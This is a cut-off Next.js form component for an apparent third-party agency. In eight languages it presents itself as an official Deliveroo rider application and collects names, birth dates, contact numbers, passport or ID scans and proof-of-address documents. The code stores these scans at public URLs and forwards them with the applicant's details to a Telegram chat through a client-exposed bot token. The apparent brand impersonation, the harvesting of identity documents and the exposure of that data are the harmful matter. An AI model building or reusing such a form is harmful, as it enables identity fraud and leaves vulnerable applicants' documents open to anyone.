"use client";

import { useState } from "react";
import { usePathname } from "next/navigation";
import { supabase } from "@/utils/supabase/client";
import { 
  CheckCircle, Loader2, Send, ChevronRight, ChevronLeft, 
  User, Phone, FileText, CheckSquare, AlertCircle, Info 
} from "lucide-react";

// دیکشنری جامع ترجمه برای فرم مرحله‌ای (پشتیبانی از تمام زبان‌ها)
const formTranslations: Record<string, any> = {
  en: {
    title: "Deliveroo Application Form",
    subtitle: "Follow the 4 simple steps below. Read the instructions carefully.",
    successTitle: "Application Received!",
    successDesc: "Excellent! Your documents have been securely uploaded and sent to our team. Please keep an eye on your WhatsApp; we will contact you shortly to complete the final live verification step.",
    steps: ["Personal", "Contact", "Documents", "Review"],
    step1Alert: "Please enter your exact details. Any mismatch between these names and your official ID will cause your application to be rejected by the Deliveroo system.",
    fnLabel: "First Name",
    fnPlaceholder: "e.g. Mohammad",
    fnDesc: "Enter your name exactly as it appears on your ID/Passport. Do not use nicknames.",
    lnLabel: "Last Name (Surname)",
    lnPlaceholder: "e.g. Ahmadi",
    lnDesc: "Enter your family name. If you don't have a last name on your ID, leave it blank or contact support.",
    dobLabel: "Date of Birth",
    dobDesc: "You must be 18 years or older to work on the Deliveroo platform.",
    emailLabel: "Email Address",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "This email will be used to register your official Deliveroo rider account.",
    waLabel: "WhatsApp Phone Number",
    waPlaceholder: "e.g. +44 7123 456789",
    waDesc: "Extremely Important: This WhatsApp number must be active. Our verification team will video call you on this number to confirm your identity.",
    docRulesTitle: "Document Guidelines",
    docRules: [
      "Take a clear, bright photo of original documents.",
      "Make sure all 4 corners of the paper/card are visible in the photo.",
      "Ensure there is no flash reflection hiding the text."
    ],
    idLabel: "1. Official ID Card, BRP, or Passport",
    idDesc: "Upload the front side of your valid ID proving your Right to Work.",
    addrLabel: "2. Proof of Address Document",
    addrDesc: "Must be a Bank Statement or Utility Bill (Water/Electricity) from the last 3 months showing your exact name and address.",
    reviewTitle: "Final Review",
    fullName: "Full Name",
    dob: "Date of Birth",
    email: "Email",
    whatsappNum: "WhatsApp Verification Number",
    attachedDocs: "Documents Attached",
    agreeText: "By clicking \"Submit Application\", you confirm that all details provided are 100% accurate. We will securely store your data and begin the process immediately.",
    back: "Back",
    next: "Next Step",
    submit: "Submit Application",
    processing: "Processing...",
    dir: "ltr"
  },
  fa: {
    title: "فرم ثبت‌نام اکانت دیلیورو",
    subtitle: "لطفاً ۴ مرحله زیر را به دقت دنبال کنید و راهنمایی‌ها را بخوانید.",
    successTitle: "درخواست شما با موفقیت ثبت شد!",
    successDesc: "عالی است! مدارک شما با موفقیت آپلود و برای تیم ما ارسال شد. لطفاً واتساپ خود را بررسی کنید؛ به زودی برای تأییدیه نهایی چهره با شما تماس خواهیم گرفت.",
    steps: ["اطلاعات شخصی", "اطلاعات تماس", "آپلود مدارک", "تأیید نهایی"],
    step1Alert: "لطفاً اطلاعات خود را دقیقاً مطابق با کارت شناسایی یا پاسپورت وارد کنید. هرگونه مغایرت باعث رد شدن درخواست شما توسط سیستم دیلیورو خواهد شد.",
    fnLabel: "نام (First Name)",
    fnPlaceholder: "مثل: محمد",
    fnDesc: "نام کوچک خود را دقیقاً همانطور که روی تذکره یا پاسپورت نوشته شده وارد کنید. از نام مستعار استفاده نکنید.",
    lnLabel: "تخلص (Last Name / Surname)",
    lnPlaceholder: "مثل: احمدی",
    lnDesc: "نام خانوادگی خود را وارد کنید. اگر در مدرک شما تخلص ثبت نشده است، این بخش را خالی بگذارید.",
    dobLabel: "تاریخ تولد",
    dobDesc: "برای کار در پلتفرم دیلیورو باید حداقل ۱۸ سال داشته باشید.",
    emailLabel: "آدرس ایمیل",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "این ایمیل برای ثبت‌نام رسمی اکانت رایدر دیلیورو شما استفاده خواهد شد.",
    waLabel: "شماره تماس واتساپ",
    waPlaceholder: "مثل: +44 7123 456789",
    waDesc: "بسیار مهم: این شماره واتساپ باید فعال باشد. تیم تأیید هویت ما برای بررسی نهایی با شما تماس تصویری خواهد گرفت.",
    docRulesTitle: "راهنمای آپلود مدارک",
    docRules: [
      "از مدارک اصلی خود عکس روشن و کاملاً واضح بگیرید.",
      "مطمئن شوید که هر ۴ گوشه کاغذ یا کارت در تصویر مشخص باشد.",
      "هیچ بازتاب نور یا فلشی نباید روی متن‌ها را بپوشاند."
    ],
    idLabel: "۱. کارت شناسایی، اقامت (BRP) یا پاسپورت معتبر",
    idDesc: "روی کارت شناسایی معتبر خود را که حق کار شما را ثابت می‌کند آپلود کنید.",
    addrLabel: "۲. مدرک اثبات آدرس (Proof of Address)",
    addrDesc: "باید صورتحساب بانکی یا قبض خدماتی (آب/برق) مربوط به ۳ ماه گذشته باشد که نام و آدرس دقیق شما روی آن درج شده است.",
    reviewTitle: "بازبینی نهایی اطلاعات",
    fullName: "نام و نام خانوادگی",
    dob: "تاریخ تولد",
    email: "ایمیل",
    whatsappNum: "شماره واتساپ جهت وریفای",
    attachedDocs: "مدارک ضمیمه‌شده",
    agreeText: "با کلیک بر روی دکمه «ثبت نهایی درخواست»، تأیید می‌کنید که تمامی اطلاعات وارد شده ۱۰۰٪ دقیق و متعلق به خود شماست. ما اطلاعات شما را کاملاً امن نگه‌داری می‌کنیم.",
    back: "مرحله قبل",
    next: "مرحله بعد",
    submit: "ثبت نهایی درخواست",
    processing: "در حال پردازش...",
    dir: "rtl"
  },
  ps: {
    title: "د ډیلیورو د غوښتنلیک فورمه",
    subtitle: "لاندې ۴ ساده مرحلې تعقیب کړئ. لارښوونې په پام سره ولولئ.",
    successTitle: "غوښتنلیک ترلاسه شو!",
    successDesc: "عالي! ستاسو اسناد په خوندي توګه اپلوډ شول او زموږ ټیم ته واستول شول. مهرباني وکړئ خپل واټساپ وګورئ؛ موږ به ډیر ژر د وروستي ژوندی تصدیق لپاره له تاسو سره اړیکه ونیسو.",
    steps: ["شخصي", "اړیکه", "اسناد", "بیاکتنه"],
    step1Alert: "مهرباني وکړئ خپل معلومات په سمه توګه د پیژندنې کارت یا پاسپورټ سره سم دننه کړئ. هر ډول توپیر به د ډیلیورو سیسټم لخوا ستاسو غوښتنلیک رد کړي.",
    fnLabel: "نوم",
    fnPlaceholder: "لکه: محمد",
    fnDesc: "خپل نوم په سمه توګه دننه کړئ لکه څنګه چې په پاسپورټ کې دی.",
    lnLabel: "تخلص",
    lnPlaceholder: "لکه: احمدي",
    lnDesc: "خپل تخلص دننه کړئ. که په سند کې تخلص نه وي، خالي یې پریږدئ.",
    dobLabel: "د زیږون نیټه",
    dobDesc: "تاسو باید لږترلږه ۱۸ کلن یاست.",
    emailLabel: "برېښنالیک پته",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "دا برېښنالیک به ستاسو د اکاونټ لپاره وکارول شي.",
    waLabel: "د واټساپ شمېره",
    waPlaceholder: "لکه: +44 7123 456789",
    waDesc: "ډیر مهم: دا شمیره باید فعاله وي.",
    docRulesTitle: "د اسنادو لارښود",
    docRules: [
      "د اصلي اسنادو روښانه عکس واخلئ.",
      "ډاډ ترلاسه کړئ چې ټول ۴ کونجونه ښکاري.",
      "هیڅ د رڼا انعکاس باید پر متنونو نه وي."
    ],
    idLabel: "۱. د پیژندنې کارت یا پاسپورټ",
    idDesc: "خپل معتبر شناخت پاڼه اپلوډ کړئ.",
    addrLabel: "۲. د پتې ثبوت",
    addrDesc: "د وروستیو ۳ میاشتو د بانک یا بریښنا بیل.",
    reviewTitle: "وروستۍ بیاکتنه",
    fullName: "بشپړ نوم",
    dob: "د زیږون نیټه",
    email: "برېښنالیک",
    whatsappNum: "د واټساپ شمیره",
    attachedDocs: "تړل شوي اسناد",
    agreeText: "د غوښتنلیک په سپارلو سره، تاسو تایید کوئ چې معلومات سم دي.",
    back: "شاته",
    next: "بل ګام",
    submit: "غوښتنلیک وسپارئ",
    processing: "په پروسه کې...",
    dir: "rtl"
  },
  de: {
    title: "Deliveroo Bewerbungsformular",
    subtitle: "Folgen Sie den 4 einfachen Schritten unten. Lesen Sie die Anweisungen sorgfältig durch.",
    successTitle: "Bewerbung erhalten!",
    successDesc: "Ausgezeichnet! Ihre Dokumente wurden sicher hochgeladen und an unser Team gesendet. Bitte behalten Sie Ihr WhatsApp im Auge; wir werden Sie in Kürze kontaktieren.",
    steps: ["Persönlich", "Kontakt", "Dokumente", "Prüfung"],
    step1Alert: "Bitte geben Sie Ihre genauen Daten ein. Jede Abweichung führt zur Ablehnung Ihrer Bewerbung.",
    fnLabel: "Vorname",
    fnPlaceholder: "z.B. Mohammad",
    fnDesc: "Geben Sie Ihren Namen genau wie im Ausweis ein.",
    lnLabel: "Nachname",
    lnPlaceholder: "z.B. Ahmadi",
    lnDesc: "Geben Sie Ihren Nachnamen ein.",
    dobLabel: "Geburtsdatum",
    dobDesc: "Sie müssen mindestens 18 Jahre alt sein.",
    emailLabel: "E-Mail-Adresse",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "Diese E-Mail wird für Ihr Konto verwendet.",
    waLabel: "WhatsApp-Nummer",
    waPlaceholder: "z.B. +44 7123 456789",
    waDesc: "Sehr wichtig: Diese Nummer muss aktiv sein.",
    docRulesTitle: "Dokumentenrichtlinien",
    docRules: [
      "Machen Sie ein klares Foto der Originaldokumente.",
      "Stellen Sie sicher, dass alle 4 Ecken sichtbar sind.",
      "Keine Blitzreflexionen auf dem Text."
    ],
    idLabel: "1. Offizieller Ausweis oder Reisepass",
    idDesc: "Laden Sie die Vorderseite Ihres gültigen Ausweises hoch.",
    addrLabel: "2. Adressnachweis",
    addrDesc: "Muss ein Kontoauszug oder eine Stromrechnung der letzten 3 Monate sein.",
    reviewTitle: "Abschließende Überprüfung",
    fullName: "Vollständiger Name",
    dob: "Geburtsdatum",
    email: "E-Mail",
    whatsappNum: "WhatsApp-Nummer",
    attachedDocs: "Angehängte Dokumente",
    agreeText: "Mit dem Absenden bestätigen Sie die Richtigkeit aller Angaben.",
    back: "Zurück",
    next: "Nächster Schritt",
    submit: "Bewerbung Absenden",
    processing: "Wird bearbeitet...",
    dir: "ltr"
  },
  ur: {
    title: "ڈیلیورو درخواست فارم",
    subtitle: "نیچے دیے گئے 4 آسان اقدمات پر عمل کریں۔ ہدایات کو غور سے پڑھیں۔",
    successTitle: "درخواست موصول ہو گئی!",
    successDesc: "بہترین! آپ کی دستاویزات کو محفوظ طریقے سے اپ لوڈ کر کے ہماری ٹیم کو بھیج دیا گیا ہے۔ براہ کرم اپنا واٹس ایپ چیک کرتے رہیں۔",
    steps: ["ذاتی", "رابطہ", "دستاویزات", "جائزہ"],
    step1Alert: "براہ کرم اپنی درست تفصیلات درج کریں۔ کسی بھی قسم کی غلطی سے درخواست مسترد ہو سکتی ہے۔",
    fnLabel: "پہلا نام (First Name)",
    fnPlaceholder: "مثلا: محمد",
    fnDesc: "اپنا نام بالکل ویسے درج کریں جیسے شناختی کارڈ پر ہے۔",
    lnLabel: "خاندانی نام (Last Name)",
    lnPlaceholder: "مثلا: احمدی",
    lnDesc: "اپنا خاندانی نام درج کریں۔ اگر آپ کے شناختی کارڈ پر خاندانی نام نہیں ہے، تو اسے خالی چھوڑ دیں یا سپورٹ سے رابطہ کریں۔",
    dobLabel: "تاریخ پیدائش",
    dobDesc: "آپ کی عمر کم از کم 18 سال ہونی چاہیے۔",
    emailLabel: "ای میل ایڈریس",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "یہ ای میل آپ کے اکاؤنٹ کے لیے استعمال ہوگی۔",
    waLabel: "واٹس ایپ فون نمبر",
    waPlaceholder: "مثلا: +44 7123 456789",
    waDesc: "بہت اہم: یہ واٹس ایپ نمبر فعال ہونا چاہیے۔",
    docRulesTitle: "دستاویزات کی ہدایات",
    docRules: [
      "اصل دستاویزات کی واضح تصویر لیں۔",
      "یقینی بنائیں کہ تمام 4 کونے نظر آرہے ہوں۔",
      "متن پر روشنی کا عکس نہیں ہونا چاہیے۔"
    ],
    idLabel: "۱. شناختی کارڈ یا پاسپورٹ",
    idDesc: "اپنا درست شناختی کارڈ اپ لوڈ کریں۔",
    addrLabel: "۲. پتے کا ثبوت",
    addrDesc: "گزشتہ 3 ماہ کا بینک اسٹیٹمنٹ یا یوٹیلیٹی بل۔",
    reviewTitle: "حتمی جائزہ",
    fullName: "پورا نام",
    dob: "تاریخ پیدائش",
    email: "ای میل",
    whatsappNum: "واٹس ایپ نمبر",
    attachedDocs: "ملاقات کی دستاویزات",
    agreeText: "درخواست جمع کرانے پر، آپ تصدیق کرتے ہیں کہ تمام تفصیلات درست ہیں۔",
    back: "پچھلا",
    next: "اگلا قدم",
    submit: "درخواست جمع کروائیں",
    processing: "پروسیسنگ...",
    dir: "rtl"
  },
  fr: {
    title: "Formulaire de candidature Deliveroo",
    subtitle: "Suivez les 4 étapes simples ci-dessous. Lisez attentivement les instructions.",
    successTitle: "Candidature reçue !",
    successDesc: "Excellent ! Vos documents ont été téléchargés en toute sécurité. Veuillez surveiller votre WhatsApp ; nous vous contacterons sous peu.",
    steps: ["Personnel", "Contact", "Documents", "Révision"],
    step1Alert: "Veuillez entrer vos coordonnées exactes. Toute divergence entraînera le rejet de votre demande.",
    fnLabel: "Prénom",
    fnPlaceholder: "ex. Mohammad",
    fnDesc: "Entrez votre prénom tel qu'il apparaît sur votre pièce d'identité.",
    lnLabel: "Nom de famille",
    lnPlaceholder: "ex. Ahmadi",
    lnDesc: "Entrez votre nom de famille.",
    dobLabel: "Date de naissance",
    dobDesc: "Vous devez avoir 18 ans ou plus.",
    emailLabel: "Adresse e-mail",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "Cet e-mail sera utilisé pour votre compte.",
    waLabel: "Numéro de téléphone WhatsApp",
    waPlaceholder: "ex. +44 7123 456789",
    waDesc: "Très important : ce numéro WhatsApp doit être actif.",
    docRulesTitle: "Directives concernant les documents",
    docRules: [
      "Prenez une photo claire des documents originaux.",
      "Assurez-vous que les 4 coins sont visibles.",
      "Assurez-vous qu'il n'y a pas de reflet de flash."
    ],
    idLabel: "1. Carte d'identité ou passeport officiel",
    idDesc: "Téléchargez le recto de votre pièce d'identité valide.",
    addrLabel: "2. Justificatif de domicile",
    addrDesc: "Doit dater de moins de 3 mois (relevé bancaire ou facture).",
    reviewTitle: "Révision finale",
    fullName: "Nom complet",
    dob: "Date de naissance",
    email: "E-mail",
    whatsappNum: "Numéro WhatsApp",
    attachedDocs: "Documents joints",
    agreeText: "En soumettant, vous confirmez que toutes les informations sont exactes à 100%.",
    back: "Retour",
    next: "Étape suivante",
    submit: "Soumettre la candidature",
    processing: "Traitement...",
    dir: "ltr"
  },
  tr: {
    title: "Deliveroo Başvuru Formu",
    subtitle: "Aşağıdaki 4 basit adımı takip edin. Talimatları dikkatlice okuyun.",
    successTitle: "Başvuru Alındı!",
    successDesc: "Mükemmel! Belgeleriniz güvenli bir şekilde yüklendi ve ekibimize gönderildi. Lütfen WhatsApp'ınızı kontrol edin; kısa süre içinde sizinle iletişime geçeceğiz.",
    steps: ["Kişisel", "İletişim", "Belgeler", "İnceleme"],
    step1Alert: "Lütfen tam bilgilerinizi girin. Kimliğinizle herhangi bir uyuşmazlık başvurunuzun reddedilmesine neden olur.",
    fnLabel: "Ad",
    fnPlaceholder: "örn. Muhammed",
    fnDesc: "Adınızı kimliğinizde göründüğü gibi girin.",
    lnLabel: "Soyadı",
    lnPlaceholder: "örn. Ahmedi",
    lnDesc: "Soyadınızı girin.",
    dobLabel: "Doğum Tarihi",
    dobDesc: "Deliveroo platformunda çalışmak için 18 yaşında veya büyük olmalısınız.",
    emailLabel: "E-posta Adresi",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "Bu e-posta hesabınız için kullanılacaktır.",
    waLabel: "WhatsApp Telefon Numarası",
    waPlaceholder: "örn. +44 7123 456789",
    waDesc: "Çok Önemli: Bu WhatsApp numarası aktif olmalıdır.",
    docRulesTitle: "Belge Yönergeleri",
    docRules: [
      "Orijinal belgelerin net ve parlak bir fotoğrafını çekin.",
      "Fotoğrafta kağıdın/kartın 4 köşesinin de göründüğünden emin olun.",
      "Metni gizleyen flaş yansıması olmadığından emin olun."
    ],
    idLabel: "1. Resmi Kimlik Kartı veya Pasaport",
    idDesc: "Geçerli kimliğinizin ön yüzünü yükleyin.",
    addrLabel: "2. Adres Kanıtı Belgesi",
    addrDesc: "Son 3 aya ait banka ekstresi veya fatura olmalıdır.",
    reviewTitle: "Son İnceleme",
    fullName: "Ad Soyad",
    dob: "Doğum Tarihi",
    email: "E-posta",
    whatsappNum: "WhatsApp Numarası",
    attachedDocs: "Eklenen Belgeler",
    agreeText: "Başvuruyu göndererek sağlanan tüm bilgilerin doğruluğunu onaylırsınız.",
    back: "Geri",
    next: "Sonraki Adım",
    submit: "Başvuruyu Gönder",
    processing: "İşleniyor...",
    dir: "ltr"
  },
  ru: {
    title: "Форма заявки Deliveroo",
    subtitle: "Выполните 4 простых шага ниже. Внимательно прочитайте инструкции.",
    successTitle: "Заявка получена!",
    successDesc: "Отлично! Ваши документы были успешно загружены. Пожалуйста, следите за вашим WhatsApp; мы свяжемся с вами в ближайшее время.",
    steps: ["Личные", "Контакты", "Документы", "Обзор"],
    step1Alert: "Пожалуйста, введите точные данные. Любое несоответствие приведет к отклонению заявки.",
    fnLabel: "Имя",
    fnPlaceholder: "напр. Мохаммад",
    fnDesc: "Введите свое имя точно так же, как в удостоверении личности.",
    lnLabel: "Фамилия",
    lnPlaceholder: "напр. Ахмади",
    lnDesc: "Введите вашу фамилию.",
    dobLabel: "Дата рождения",
    dobDesc: "Вы должны быть старше 18 лет.",
    emailLabel: "Адрес электронной почты",
    emailPlaceholder: "yourname@gmail.com",
    emailDesc: "Этот email будет использоваться для вашего аккаунта.",
    waLabel: "Номер телефона WhatsApp",
    waPlaceholder: "напр. +44 7123 456789",
    waDesc: "Очень важно: этот номер WhatsApp должен быть активным.",
    docRulesTitle: "Правила загрузки документов",
    docRules: [
      "Сделайте четкое фото оригиналов документов.",
      "Убедитесь, что все 4 угла видны на фото.",
      "Убедитесь в отсутствии вспышки, скрывающей текст."
    ],
    idLabel: "1. Официальное удостоверение личности или паспорт",
    idDesc: "Загрузите лицевую сторону вашего действительного удостоверения.",
    addrLabel: "2. Документ, подтверждающий адрес",
    addrDesc: "Должен быть банковской выпиской или счетом за коммунальные услуги за последние 3 месяца.",
    reviewTitle: "Итоговый обзор",
    fullName: "ФИО",
    dob: "Дата рождения",
    email: "Эл. почта",
    whatsappNum: "Номер WhatsApp",
    attachedDocs: "Прикрепленные документы",
    agreeText: "Нажимая кнопку отправки, вы подтверждаете точность всех данных.",
    back: "Назад",
    next: "Следующий шаг",
    submit: "Отправить заявку",
    processing: "Обработка...",
    dir: "ltr"
  }
};

export default function SafiAgencyForm() {
  const pathname = usePathname();
  
  // تشخیص هوشمند زبان از روی بخش اول URL (پیش‌فرض انگلیسی در صورت عدم تطابق)
  const langSegment = pathname.split('/')[1];
  const currentLangCode = formTranslations[langSegment] ? langSegment : 'en';
  const t = formTranslations[currentLangCode];

  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [dateOfBirth, setDateOfBirth] = useState("");
  const [email, setEmail] = useState("");
  const [whatsappNumber, setWhatsappNumber] = useState("");
  const [idCardFile, setIdCardFile] = useState<File | null>(null);
  const [proofOfAddressFile, setProofOfAddressFile] = useState<File | null>(null);

  // ارسال نوتیفیکیشن به تلگرام همراه با لینک مدارک
  const sendTelegramNotification = async (idUrl: string, addressUrl: string) => {
    const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN; 
    const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID; 

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

    const message = `
🚀 *درخواست جدید برای اکونت دیلیورو* 🚀

👤 *نام:* ${firstName}
👥 *تخلص:* ${lastName}
📅 *تاریخ تولد:* ${dateOfBirth}
📧 *ایمیل:* ${email}
📱 *واتساپ:* ${whatsappNumber}
🌐 *زبان سایت:* ${currentLangCode.toUpperCase()}

📄 *لینک‌های مدارک آپلود شده:*
[🖼️ اسکن مدرک شناسایی](${idUrl})
[🏠 مدرک اثبات آدرس](${addressUrl})

✅ اطلاعات با موفقیت ثبت شد.
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
    } catch (error) {
      console.error("Telegram error:", error);
    }
  };

  const handleNextStep = () => {
    setErrorMessage("");
    if (step === 1 && (!firstName || !lastName || !dateOfBirth)) {
      setErrorMessage(currentLangCode === 'fa' ? "لطفاً تمام اطلاعات شخصی را کامل کنید." : "Please complete all personal details.");
      return;
    }
    if (step === 2 && (!email || !whatsappNumber)) {
      setErrorMessage(currentLangCode === 'fa' ? "لطفاً اطلاعات تماس خود را وارد کنید." : "Please provide your contact information.");
      return;
    }
    if (step === 3 && (!idCardFile || !proofOfAddressFile)) {
      setErrorMessage(currentLangCode === 'fa' ? "آپلود هر دو مدرک الزامی است." : "Both documents are required.");
      return;
    }
    setStep((prev) => prev + 1);
  };

  const handlePrevStep = () => {
    setErrorMessage("");
    setStep((prev) => prev - 1);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage("");

    try {
      if (!idCardFile || !proofOfAddressFile) throw new Error("Missing documents.");

      const uploadFolder = `${email}_${Date.now()}`;

      const { data: idData, error: idError } = await supabase.storage
        .from('safi-agency-documents')
        .upload(`${uploadFolder}/id_card_${idCardFile.name}`, idCardFile);
      if (idError) throw idError;

      const { data: addressData, error: addressError } = await supabase.storage
        .from('safi-agency-documents')
        .upload(`${uploadFolder}/proof_of_address_${proofOfAddressFile.name}`, proofOfAddressFile);
      if (addressError) throw addressError;

      const { data: idPublicUrl } = supabase.storage.from('safi-agency-documents').getPublicUrl(idData.path);
      const { data: addressPublicUrl } = supabase.storage.from('safi-agency-documents').getPublicUrl(addressData.path);

      const { error: dbError } = await supabase
        .from('safi_agency_applications')
        .insert([{
            first_name: firstName,
            last_name: lastName,
            date_of_birth: dateOfBirth,
            email: email,
            whatsapp_number: whatsappNumber,
            id_card_url: idPublicUrl.publicUrl,
            proof_of_address_url: addressPublicUrl.publicUrl,
            service_type: 'deliveroo_rider_uk',
            selected_language: currentLangCode,
            status: 'pending',
            is_verified: false
        }]);
      if (dbError) throw dbError;

      await sendTelegramNotification(idPublicUrl.publicUrl, addressPublicUrl.publicUrl);
      setSuccess(true);
    } catch (err: any) {
      setErrorMessage(err.message || "An error occurred.");
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div dir={t.dir} className="max-w-xl mx-auto bg-zinc-900/90 backdrop-blur-xl border border-emerald-500/50 p-10 rounded-3xl text-center space-y-6 shadow-[0_0_40px_rgba(16,185,129,0.2)]">
        <div className="w-20 h-20 bg-emerald-500/10 border border-emerald-500/30 rounded-full flex items-center justify-center mx-auto">
          <CheckCircle className="w-10 h-10 text-emerald-400 animate-pulse" />
        </div>
        <h2 className="text-3xl font-extrabold text-white">{t.successTitle}</h2>
        <p className="text-zinc-400 text-sm leading-relaxed max-w-md mx-auto">
          {t.successDesc}
        </p>
      </div>
    );
  }

  return (
    <div dir={t.dir} className="max-w-2xl mx-auto bg-zinc-900/80 backdrop-blur-2xl border border-zinc-800 p-8 md:p-12 rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.5)] relative overflow-hidden">
      
      {/* Header & Progress Bar */}
      <div className="mb-10 space-y-6">
        <div className="text-center space-y-2">
          <h1 className="text-3xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400 drop-shadow-md">
            {t.title}
          </h1>
          <p className="text-zinc-400 text-sm">{t.subtitle}</p>
        </div>

        <div className="relative pt-4">
          <div className="flex items-center justify-between relative z-10">
            {t.steps.map((label: string, index: number) => {
              const num = index + 1;
              const IconComponent = [User, Phone, FileText, CheckSquare][index];
              return (
                <div key={num} className="flex flex-col items-center space-y-2">
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center border-2 transition-all duration-500 ${step >= num ? 'bg-emerald-500 text-black border-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.5)]' : 'bg-zinc-950 text-zinc-600 border-zinc-800'}`}>
                    <IconComponent className="w-4 h-4" />
                  </div>
                  <span className={`text-[10px] font-bold uppercase hidden sm:block ${step >= num ? 'text-emerald-400' : 'text-zinc-600'}`}>
                    {label}
                  </span>
                </div>
              );
            })}
          </div>
          <div className="absolute top-9 left-0 w-full h-1 bg-zinc-800 -z-0 rounded-full">
            <div className="h-full bg-gradient-to-r from-emerald-500 to-cyan-500 rounded-full transition-all duration-500 ease-out" style={{ width: `${((step - 1) / 3) * 100}%` }}></div>
          </div>
        </div>
      </div>

      {errorMessage && (
        <div className="flex items-center space-x-2 space-x-reverse bg-red-500/10 border border-red-500/30 text-red-400 p-4 rounded-2xl text-sm mb-6">
          <AlertCircle className="w-5 h-5 flex-shrink-0" />
          <span>{errorMessage}</span>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-8 min-h-[350px]">
        
        {/* STEP 1 */}
        {step === 1 && (
          <div className="space-y-6">
            <div className="bg-cyan-500/10 border border-cyan-500/20 p-4 rounded-xl flex items-start space-x-3 space-x-reverse mb-4">
              <Info className="w-5 h-5 text-cyan-400 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-cyan-100 leading-relaxed">{t.step1Alert}</p>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-zinc-300">{t.fnLabel} <span className="text-emerald-400">*</span></label>
              <input type="text" placeholder={t.fnPlaceholder} value={firstName} onChange={(e) => setFirstName(e.target.value)} className="w-full bg-zinc-950/50 border border-zinc-800 rounded-2xl px-5 py-4 text-white focus:outline-none focus:border-emerald-500" />
              <p className="text-[11px] text-zinc-500">{t.fnDesc}</p>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-zinc-300">{t.lnLabel} <span className="text-emerald-400">*</span></label>
              <input type="text" placeholder={t.lnPlaceholder} value={lastName} onChange={(e) => setLastName(e.target.value)} className="w-full bg-zinc-950/50 border border-zinc-800 rounded-2xl px-5 py-4 text-white focus:outline-none focus:border-emerald-500" />
              <p className="text-[11px] text-zinc-500">{t.lnDesc}</p>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-zinc-300">{t.dobLabel} <span className="text-emerald-400">*</span></label>
              <input type="date" value={dateOfBirth} onChange={(e) => setDateOfBirth(e.target.value)} className="w-full bg-zinc-950/50 border border-zinc-800 rounded-2xl px-5 py-4 text-white focus:outline-none focus:border-emerald-500 [color-scheme:dark]" />
              <p className="text-[11px] text-zinc-500">{t.dobDesc}</p>
            </div>
          </div>
        )}

        {/* STEP 2 */}
        {step === 2 && (
          <div className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-bold text-zinc-300">{t.emailLabel} <span className="text-emerald-400">*</span></label>
              <input type="email" placeholder={t.emailPlaceholder} value={email} onChange={(e) => setEmail(e.target.value)} className="w-full bg-zinc-950/50 border border-zinc-800 rounded-2xl px-5 py-4 text-white focus:outline-none focus:border-emerald-500" />
              <p className="text-[11px] text-zinc-500">{t.emailDesc}</p>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-zinc-300">{t.waLabel} <span className="text-emerald-400">*</span></label>
              <input type="text" placeholder={t.waPlaceholder} value={whatsappNumber} onChange={(e) => setWhatsappNumber(e.target.value)} className="w-full bg-zinc-950/50 border border-zinc-800 rounded-2xl px-5 py-4 text-white focus:outline-none focus:border-emerald-500" dir="ltr" />
              <div className="bg-emerald-500/10 border border-emerald-500/20 p-3 rounded-xl mt-2">
                <p className="text-xs text-emerald-400 font-semibold leading-relaxed">{t.waDesc}</p>
              </div>
            </div>
          </div>
        )}

        {/* STEP 3 */}
        {step === 3 && (
          <div className="space-y-8">
            <div className="p-4 bg-zinc-950 border border-zinc-800 rounded-xl space-y-2">
              <h3 className="text-white font-bold text-sm flex items-center">
                <FileText className="w-4 h-4 ml-2 rtl:mr-2 text-cyan-400" /> {t.docRulesTitle}
              </h3>
              <ul className="list-disc list-inside text-[11px] text-zinc-400 space-y-1">
                {t.docRules.map((rule: string, i: number) => <li key={i}>{rule}</li>)}
              </ul>
            </div>

            <div className="space-y-3">
              <label className="text-sm font-bold text-zinc-300">{t.idLabel} <span className="text-emerald-400">*</span></label>
              <input type="file" accept="image/*,application/pdf" onChange={(e) => setIdCardFile(e.target.files?.[0] || null)} className="w-full bg-zinc-950/50 border border-zinc-800 rounded-2xl px-4 py-3 text-sm text-zinc-400 file:ml-4 rtl:file:mr-4 file:py-2.5 file:px-6 file:rounded-xl file:border-0 file:text-sm file:font-bold file:bg-emerald-500 file:text-black cursor-pointer" />
              <p className="text-[11px] text-zinc-500">{t.idDesc}</p>
            </div>

            <div className="space-y-3">
              <label className="text-sm font-bold text-zinc-300">{t.addrLabel} <span className="text-emerald-400">*</span></label>
